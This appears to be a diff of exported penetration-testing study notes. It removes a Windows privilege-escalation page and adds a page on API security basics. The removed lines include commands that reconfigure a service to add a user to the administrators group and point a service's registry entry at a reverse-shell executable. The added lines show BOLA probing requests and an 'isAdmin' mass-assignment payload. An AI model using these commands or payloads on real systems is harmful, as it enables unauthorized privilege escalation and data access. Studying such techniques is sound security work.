@@ -1,4 +1,4 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Service Permissions (Paths)</title><style>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>API Security Basics </title><style>
 /* cspell:disable-file */
 /* webkit printing magic: print all background colors */
 html {
@@ -666,29 +666,43 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body><article id="fb35617e-95ee-409d-a517-c3e3303a9456" class="page sans"><header><h1 class="page-title">Service Permissions (Paths)</h1></header><div class="page-body"><p id="ed3787e4-0ec5-4a60-9e30-3575c28d127e" class="">Insecure Service Permissions:</p><ul id="dbd65238-48ff-4041-a9fa-c938fc41db25" class="bulleted-list"><li style="list-style-type:disc">must be able to start/stop service or restart machine</li></ul><pre id="244469a5-b96f-4c1b-ae52-4fa1e6c8e103" class="code"><code>.\accesschk.exe /accepteula -uwcqv user &lt;service-found&gt;
-sc qc &lt;service-found&gt;
-sc query &lt;service-found&gt;</code></pre><p id="31b561cb-f956-4337-a511-346de5e214c6" class="">
-</p><p id="3e5564c6-dd0e-48e9-8107-55b2358e9c4a" class=""><strong>Binary Paths:</strong></p><p id="05cb546b-a6e0-4e84-b3bb-1c09b341ee62" class="">Powerup method (easy):</p><pre id="9896f129-1b05-4fa8-b384-8aee89f346e0" class="code"><code>powershell -ep bypass
-. .\PowerUp.ps1
-Invoke-AllChecks
-#finds service permissions</code></pre><p id="4362c780-f2d5-4d6e-942d-c2eb99da3e3b" class="">Accesschk64.exe:</p><pre id="191c580f-c994-424b-be16-4bc1a689aed6" class="code"><code>Accesschk64.exe -uwcv Everyone *
-Accesschk64.exe -uwcv &lt;service-found&gt;
-sc qc &lt;service-found&gt;
-sc config &lt;service-found&gt; binpath= &quot;net localgroup administrators user /add&quot;
-sc start &lt;service-found&gt;</code></pre><p id="97133573-b678-4756-b4e7-861e33ae0b39" class="">
-</p><p id="96f9afa1-dfdd-46d0-9ac1-f2cbd7ea3229" class=""><strong>Unquoted Service Paths:</strong></p><p id="04d6bd48-e82a-4278-b544-0d6fb96cf03a" class="">Powerup method (easy):</p><pre id="05910add-da54-41b7-b3ec-544b38f6da9f" class="code"><code>powershell -ep bypass
-. .\PowerUp.ps1
-Invoke-AllChecks
-#finds unqouted services</code></pre><p id="81d7c026-67de-40b4-84d2-45fb7aec2569" class="">
-</p><p id="db6f05b6-d2e7-47d5-a46a-8b5fd442556c" class="">Once found add a malicious executable where the cut off service exists for it to be run…</p><p id="cd30d37f-5987-4b97-9db2-2ddef262e512" class="">restart program/machine…</p><p id="1f2e3980-aa04-46fe-b7ba-02c4f03a6bc3" class="">
-</p><p id="efcb965c-232e-43ea-bc80-f9427a3af8aa" class="">
-</p><p id="2130a336-35aa-4231-a1ba-6f05309e6403" class=""><strong>Weak Registry Permissions:</strong></p><pre id="385eba8e-ca8b-4c32-a235-1fd52c713cf6" class="code"><code>#modifiable registry permissions found on winpeas
-powershell -exec bypass
-Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc # the registry found
-.\accesschk.exe /accepteula -uwcqv HKLM:\System\CurrentControlSet\Services\regsvc
-.\accesschk.exe /accepteula -uwcqv user regsvc
-reg query HKLM:\System\CurrentControlSet\Services\regsvc
-reg add HKLM:\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\reverse.exe /f
-net start regsvc</code></pre><p id="76d6f75f-5417-485f-a28a-04368d43429c" class="">
+</style></head><body><article id="4a98f418-9c3e-472e-a504-f8050998e697" class="page sans"><header><h1 class="page-title">API Security Basics </h1></header><div class="page-body"><p id="7933322b-d769-403c-ac88-bf30c610d570" class="">Headers:</p><p id="41916f6f-1fe9-47de-98d0-6720e0cb78e0" class=""><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers</a></p><p id="c47e0185-a406-4410-b88a-5c1221264f9b" class="">
+</p><p id="77edb73d-f235-44c6-99b4-581736ff6c40" class=""><strong>Information Disclosure:</strong></p><ul id="ff4d810c-529a-4a20-8b96-886d81cfca64" class="bulleted-list"><li style="list-style-type:disc">Information may be disclosed in API responses or public sources such as
+code repositories, search results, news, social media, the target’s website,
+and public API directories.</li></ul><p id="3d49af06-7a24-4af9-8c84-edfc9096e8b5" class="">
+</p><p id="f3bb71ed-6cd9-4ced-86bb-3a8461fffe6d" class=""><strong>Broken Object Level Authorization</strong></p><ul id="2a2a0df5-b817-461b-be9e-6d88d0f81d0c" class="bulleted-list"><li style="list-style-type:disc">BOLA vulnerabilities occur when an API provider allows an
+API consumer access to resources they are not authorized to access.</li></ul><p id="a2398c77-d594-4646-aab6-33fde75fc762" class="">In general, you can test for BOLAs by understanding how an API’s
+resources are structured and attempting to access resources you shouldn’t
+be able to access. By detecting patterns within API paths and parameters,
+you should be able to predict other potential resources. The bolded elements in the following API requests should catch your attention:</p><pre id="494923fc-0f7b-4532-905b-8c605ee5fb04" class="code"><code>
+GET /api/resource/1
+GET /user/account/find?user_id=15
+POST /company/account/Apple/balance
+POST /admin/pwreset/account/90</code></pre><p id="56317a1c-ab5a-4d46-8a64-972a5c56c2ba" class="">In these instances, you can probably guess other potential resources,
+like the following, by altering the bolded values:</p><pre id="23c1e532-b99a-48e7-b160-70a313986717" class="code"><code>GET /api/resource/3
+GET /user/account/find?user_id=23
+POST /company/account/Google/balance
+POST /admin/pwreset/account/111</code></pre><p id="fa9b2baf-9a09-4b28-bfec-53fed94ca125" class="">
+</p><p id="a2f74747-f8dd-42bc-a468-f9ab314c9436" class=""><strong>Broken User Authentication</strong></p><ul id="39f40abd-76c4-4932-9e46-80d074c4ac7f" class="bulleted-list"><li style="list-style-type:disc">Broken user authentication refers to any weakness within the API authentication process. These vulnerabilities typically occur when an API provider either doesn’t implement an authentication protection mechanism or implements a mechanism incorrectly.</li></ul><p id="86264f75-d675-496c-8cb1-99bf1c88ae10" class="">
+</p><p id="b96f5aea-c959-4066-882f-e8cd4e080ce6" class=""><strong>Excessive Data Exposure</strong></p><ul id="55c06292-abee-46aa-a1e4-64e9602da046" class="bulleted-list"><li style="list-style-type:disc">Excessive data exposure is when an API endpoint responds with more information than is needed to fulfill a request.</li></ul><p id="d5a874ac-7c8a-4081-8f6e-9636e50074e4" class="">
+</p><p id="96b6442e-6209-4ce7-9189-afcdaa899f31" class=""><strong>Lack of Resources and Rate Limiting</strong></p><ul id="85878e9c-914c-47de-a0f8-73caf48612dc" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="7b8dae93-8341-45b8-bd90-155c7932f13c" class="">
+</p><p id="28889e40-1e12-4383-b063-eb221eef459f" class="">
+</p><p id="b5d81da5-6218-4c85-89e2-732726712338" class=""><strong>Broken Function Level Authorization</strong></p><ul id="184e0de7-d559-40fb-b08e-22dc33b962ab" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="729d7a2a-920d-4b5b-830c-94500e07812f" class="">
+</p><p id="0c09a675-f97b-46ed-9991-37c2a1273117" class="">
+</p><p id="68a50c4a-8a30-4d87-9ff0-bbe0e7d2beb2" class=""><strong>Mass Assignment</strong></p><p id="44223d8b-d456-406b-b078-7242de4114b9" class="">Imagine an API is called to create an account with parameters for &quot;User&quot; and &quot;Password&quot;:</p><pre id="a85f125c-6c32-4e48-bc6a-0b33599a08b7" class="code"><code>{
+&quot;User&quot;: &quot;scuttleph1sh&quot;,
+&quot;Password&quot;: &quot;GreatPassword123&quot;
+}</code></pre><p id="79be8273-32bc-4ccd-a1b1-0d1adb4abd52" class="">While reading the API documentation regarding the account creation
+process, suppose you discover that there is an additional key, &quot;isAdmin&quot;, that
+consumers can use to become administrators. You could use a tool like
+Postman or Burp Suite to add the attribute to a request and set the value
+to true:</p><pre id="c38794cc-d5dd-4dd9-9b7e-05e83f529d9a" class="code"><code>{
+&quot;User&quot;: &quot;scuttleph1sh&quot;,
+&quot;Password&quot;: &quot;GreatPassword123&quot;,
+&quot;isAdmin&quot;: true
+}</code></pre><p id="49824f5f-9c27-44bd-af1a-69fd5dcbf196" class="">If the API does not sanitize the request input, it is vulnerable to mass
+assignment, and you could use the updated request to create an admin
+account. On the backend, the vulnerable web app will add the key/value
+attribute, {&quot;isAdmin&quot;:&quot;true&quot;}, to the user object and make the user the equivalent of an administrator.</p><p id="2ada183d-685a-4976-a2e1-107d3d6cc20f" class="">
+</p><p id="a85ccfd0-6501-4aba-99e1-dca8f0df6646" class=""><strong>Security Misconfigurations</strong></p><p id="e57bcc12-ab80-48e9-959f-4a5087033699" class="">
 </p></div></article></body></html>
